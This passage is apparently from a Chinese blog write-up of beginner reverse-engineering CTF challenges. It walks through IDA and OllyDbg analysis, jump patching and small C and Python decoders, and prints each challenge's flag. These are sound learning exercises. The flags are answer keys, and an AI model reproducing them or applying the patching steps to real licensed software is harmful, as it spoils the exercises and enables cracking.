class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[] = <span class="hljs-string">&quot;^SdVkT#S ]`Y\\!^)\x8f\x80ism&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">21</span>; i++)<br>&#123;<br>flag[i] = (flag[i] - <span class="hljs-number">16</span>) ^ <span class="hljs-number">32</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>nctf{d3c0mpil1n9_PyC}</p></blockquote><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>查壳，无壳，32位的程序</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/7.png"></p><p>使用IDA打开分析，看到我们输入的值字符串会和<code>v5.m128i_i8</code>进行比较，查看其中的值</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/8.png"></p><p>查看得到flag，注意这里是小端序</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/9.png"></p><blockquote><p>DUTCTF{We1c0met0DUTCTF}</p></blockquote><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>查壳，无壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/10.png"></p><p>这是一个游戏，需要把所有的灯都点亮，才可以输出flag。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/11.png"></p><p>使用OD调试，搜索字符串可以看到flag成功输出的这里，只要能够运行到这里就可以了。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/12.png"></p><p>可以直接在函数头部右键，选择此处为新的EIP，然后直接跑起来，flag就会自己出来。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/13.png"></p><p>也可以修改之前的跳转条件，让程序可以运行到输出flag的地方。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/14.png"></p><h3 id="注册机-2"><a href="#注册机-2" class="headerlink" title="注册机"></a>注册机</h3><p>使用IDA查看，可以看到如果满足所有的条件就会进入<code>sub_457AB4</code></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/15.png"></p><p>这是生成flag的地方，可以根据这里写出注册机。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/16.png"></p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">int main() &#123;<br>unsigned char v5[] = &quot;<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>41&quot;<br>&quot;<span class="hljs-symbol">\x</span>1F<span class="hljs-symbol">\x</span>4E<span class="hljs-symbol">\x</span>3E<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>3E<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>05&quot;<br>&quot;<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>2C<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>4E<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>36<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>2C<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>40&quot;<br>&quot;<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>2D<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>0F<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>10&quot;;<br>unsigned char v2[] = &quot;<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>6C<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>7C<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>7D<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>7C<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>4A<span class="hljs-symbol">\x</span>31&quot;<br>&quot;<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>6C<span class="hljs-symbol">\x</span>5E<span class="hljs-symbol">\x</span>6C<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>2C<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>5F<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>65&quot;<br>&quot;<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>7F<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>6B<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>5C<span class="hljs-symbol">\x</span>1D<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>6B<span class="hljs-symbol">\x</span>5A<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>0C&quot;<br>&quot;<span class="hljs-symbol">\x</span>2B<span class="hljs-symbol">\x</span>4C<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>7E&quot;;<br>for (int i = 0; i &lt; 56; i++)<br>&#123;<br>v2[i] = v2[i] ^ 0x13;<br>v2[i] = v2[i] ^ v5[i];<br>&#125;<br>printf(&quot;<span class="hljs-variable">%s&quot;, v2);</span><br><span class="hljs-variable">&#125;</span><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/17.png"></p><blockquote><p>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p></blockquote><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>打开题目是一个C的源代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;        <span class="hljs-comment">//参数为4个</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;what?\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> first = atoi(argv[<span class="hljs-number">1</span>]); <br>    <span class="hljs-keyword">if</span> (first != <span class="hljs-number">0xcafe</span>) &#123;     <span class="hljs-comment">//第一个参数atoi后为0xcafe、51966</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are wrong, sorry.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> second = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">if</span> (second % <span class="hljs-number">5</span> == <span class="hljs-number">3</span> || second % <span class="hljs-number">17</span> != <span class="hljs-number">8</span>) &#123;<span class="hljs-comment">//第二个参数 除以5 余数不能是3，除以17余数要等于8</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;h4cky0u&quot;</span>, argv[<span class="hljs-number">3</span>])) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;so close, dude!\n&quot;</span>);    <span class="hljs-comment">//第三个参数，等于h4cky0u</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Brr wrrr grr\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> hash = first * <span class="hljs-number">31337</span> + (second % <span class="hljs-number">17</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]) - <span class="hljs-number">1615810207</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get your key: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, hash);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>根据源码分析可以知道需要输入三个参数，三个参数满足条件后就会输出flag。</p><ul><li>第一个参数是<code>51966</code></li><li>第二个参数除以5 余数不能是3，除以17余数要等于8</li><li>第三个参数，等于<code>h4cky0u</code></li></ul><p>根据条件求第二个参数，有很多，选择其中一个</p><p>python：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">if</span>(i % <span class="hljs-number">5</span> != <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> i % <span class="hljs-number">17</span> == <span class="hljs-number">8</span>):<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/18.png"></p><p>得到flag</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/19.png"></p><blockquote><p>c0ffee</p></blockquote><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><p>查壳，可以看到是UPX的壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/21.png"></p><p>直接使用<code>upx-d</code>脱壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/20.png"></p><p>使用IDA打开，直接看到flag</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/22.png"></p><blockquote><p>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</p></blockquote><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><h3 id="详细分析-3"><a href="#详细分析-3" class="headerlink" title="详细分析"></a>详细分析</h3><p>64位elf文件，无壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/23.png"></p><p>使用IDA打开。可以明显的看到具体的比较地方，和flag生成的方式。&amp;v7+i%v6，其中v6是7，也就是&amp;v7+i%7，将v7转换为字符，一共就是七个，而i取7的余数，这里就是在不断的获取v7的每一位来与v8进行异或。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/24.png"></p><h3 id="注册机-3"><a href="#注册机-3" class="headerlink" title="注册机"></a>注册机</h3><p>根据上面的分析写出注册机</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a[] = <span class="hljs-string">&quot;\x68\x61\x72\x61\x6D\x62\x65&quot;</span>;<br>    <span class="hljs-keyword">char</span> flag[] = <span class="hljs-string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); i++)<br>    &#123;<br>        flag[i] = flag[i] ^ (a[i % <span class="hljs-number">7</span>]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/25.png"></p><blockquote><p>RC3-2016-XORISGUD</p></blockquote><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><p>查壳，无壳，32位elf文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/26.png"></p><p>使用IDA打开，分析发现关键函数是<code>authenticate</code></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/27.png"></p><p>看到输入被曝存在ws之中，然后<code>wcscmp</code>会比较s2和ws，s2是经过<code>decrypt</code>函数生成的。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/28.png"></p><p>查看具体的算法，看到是非常简单的减法。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/29.png"></p><p>数据为图中框起来的数据循环的减去1-5这几个数（因为都带着0x14，所以直接可以去掉0x14的）</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/30.png"></p><h3 id="注册机-4"><a href="#注册机-4" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">int main() &#123;<br>    unsigned char s[] = &quot;<span class="hljs-symbol">\x</span>3A<span class="hljs-symbol">\x</span>36<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>3B<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>7A<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>6B<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>78&quot;<br>                        &quot;<span class="hljs-symbol">\x</span>6A<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>6A<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>7B<span class="hljs-symbol">\x</span>80&quot;;<br>    int a[] = &#123; 1,2,3,4,5 &#125;;<br>    for (int i = 0; i &lt; 38; i++)<br>    &#123;<br>        s[i] -= a[i <span class="hljs-variable">% 5];</span><br><span class="hljs-variable">    &#125;</span><br><span class="hljs-variable">    printf(&quot;%</span>s&quot;, s);<br>    return 0;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/31.png"></p><blockquote><p>9447{you_are_an_international_mystery}</p></blockquote><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>无壳，64位ELF文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/33.png"></p><p>使用IDA打开，看到主要的流程是打开/tmp/flag.txt，然后向其中写入一些东西，但是最后又调用<code>remove</code>函数将其删除，所以是不可能查看flag.txt的，那么就看一下其写入的数据。看图中框选起来的部分可以看到，将s数组的每一位通过+1或者-1放在了t的十位以后的位置。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/32.png"></p><p>查看s与t</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/34.png"></p><h3 id="注册机-5"><a href="#注册机-5" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> flag[] = <span class="hljs-string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>;<br>    <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>)<br>        &#123;<br>            flag[i] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            flag[i] -= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SharifCTF&#123;%s&#125;&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/35.png"></p><blockquote><p>SharifCTF{b70c59275fcfa8aebf2d5911223c6589}</p></blockquote><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h3 id="详细分析-4"><a href="#详细分析-4" class="headerlink" title="详细分析"></a>详细分析</h3><p>查壳，无壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/36.png"></p><p>直接运行程序，看到会弹出一个窗口，但是其中都是乱码根本不可读</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/38.png"></p><p>使用IDA打开，看到lpMem就是那段乱码，正常流程都是弹窗显示这串字符，注意到<code>sub_401000</code>函数，其传入了参数lpMem</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/37.png"></p><p>在其中对于lpMem进行了操作，可以看到主要是异或，并且四个字符作为一组来进行异或。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/39.png"></p><p>原始数据以及异或用的KEY</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/40.png"></p><h3 id="注册机-6"><a href="#注册机-6" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">int main() &#123;<br>    unsigned char a[] = &quot;<span class="hljs-symbol">\x</span>BB<span class="hljs-symbol">\x</span>AA<span class="hljs-symbol">\x</span>CC<span class="hljs-symbol">\x</span>DD&quot;;<br>    unsigned char flag[] = &quot;<span class="hljs-symbol">\x</span>BB<span class="hljs-symbol">\x</span>CC<span class="hljs-symbol">\x</span>A0<span class="hljs-symbol">\x</span>BC<span class="hljs-symbol">\x</span>DC<span class="hljs-symbol">\x</span>D1<span class="hljs-symbol">\x</span>BE<span class="hljs-symbol">\x</span>B8<span class="hljs-symbol">\x</span>CD<span class="hljs-symbol">\x</span>CF<span class="hljs-symbol">\x</span>BE<span class="hljs-symbol">\x</span>AE<span class="hljs-symbol">\x</span>D2<span class="hljs-symbol">\x</span>C4<span class="hljs-symbol">\x</span>AB<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>D2<span class="hljs-symbol">\x</span>D9<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>B3<span class="hljs-symbol">\x</span>D4<span class="hljs-symbol">\x</span>DE<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>A9<span class="hljs-symbol">\x</span>D3<span class="hljs-symbol">\x</span>CB<span class="hljs-symbol">\x</span>B8<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>D3<span class="hljs-symbol">\x</span>CB<span class="hljs-symbol">\x</span>BE<span class="hljs-symbol">\x</span>B9&quot;<br>        &quot;<span class="hljs-symbol">\x</span>9A<span class="hljs-symbol">\x</span>D7<span class="hljs-symbol">\x</span>CC<span class="hljs-symbol">\x</span>DD&quot;;<br>    for (int i = 0; i &lt; 36; i++)<br>    &#123;<br>        flag[i] = flag[i] ^ a[i<span class="hljs-variable">%4];</span><br><span class="hljs-variable">        printf(&quot;%</span>c&quot;, flag[i]);<br>    &#125;<br>    return 0;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/41.png"></p><blockquote><p>flag{reversing_is_not_that_hard!}</p></blockquote><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>无壳，64位的elf文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/42.png"></p><p>限制是必须是输入24位，前五位是“nctf{”，最后一位是“}”</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/49.png"></p><p>看到最终成功的条件是，一系列操作之后<code>asc_601060[8 * v9 + 